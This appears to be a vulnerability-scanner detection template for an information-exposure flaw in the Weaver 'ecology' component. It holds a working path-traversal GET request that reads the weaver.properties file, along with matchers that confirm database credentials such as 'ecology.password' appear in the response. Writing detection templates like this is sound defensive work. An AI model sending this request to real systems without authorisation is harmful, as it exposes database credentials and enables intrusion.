id: ecology-info-leak
brief:
    title: Ecology - Information Exposure
    by: qianbenhyu
    level: high
    about: The "ecology" component exposes a file that contains sensitive database credentials (dbuser/dbpass).
    label:
        - ecology
        - unauth
        - misconfig
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties'
      signs:
        - "on": word
          has:
            - ecology.password
            - ecology.charset
          in: body
          need: all
        - "on": word
          has:
            - text/plain
          in: header
          need: all
        - "on": status
          status:
            - 200
